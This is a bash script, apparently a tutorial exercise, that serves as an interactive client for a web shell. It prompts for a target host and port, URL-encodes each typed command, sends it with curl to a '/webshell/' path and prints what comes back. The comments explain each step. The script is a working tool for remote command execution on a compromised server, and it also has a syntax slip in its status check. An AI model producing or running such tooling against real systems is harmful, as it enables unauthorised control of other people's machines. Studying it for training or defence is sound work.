#!/bin/bash


read -p 'Host: ' host
read -p 'Port: ' port

while true; do
    read -p '$ ' raw_command
    command=$(printf %s "${raw_command}" | jq -sRr @uri)
    response=$(curl -s -w "%{http_code}" \
        -o /dev/null "http://${host}:${port}/webshell/${command}")
    http_code=$(tail -n1 <<< "$response")

    # Check if the HTTP status code is a valid integer.
    if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
        if [ "${http_code}" -eq 200]; then
            curl "http://${host}:${port}/webshell/${command}"
        else
            echo "Error: HTTP status code ${http_code}"
        fi
    else
        echo "Error: Invalid HTTP status code received"
    fi
done

# We begin the script by collecting the host address and port for the remote
# target to which we want to connect. Inside a while loop, the script asks the user
# to enter a command to execute. We encode the command string by using jq and
# its built in @uri function, which converts the input string to a URI-encoded string.
# Next, we send the target a specially crafter curl request. The -s option 
# supresses any unnecessary curl output that isn't directly related to the bash
# command. Next, the -w argument specifies a custom output format for curl.
# In this case, %{http_code} is a placeholder that will be replaced with the
# request's HTTP response code. This allows us to retrive the status code separately.
# Also, we can see that this curl request uses the -o output argument and points
# it to /dev/null, meaning we discard the response body.
# We check whether the HTTP status code is 200. We then send a second curl
# request to retrieve the output.
    
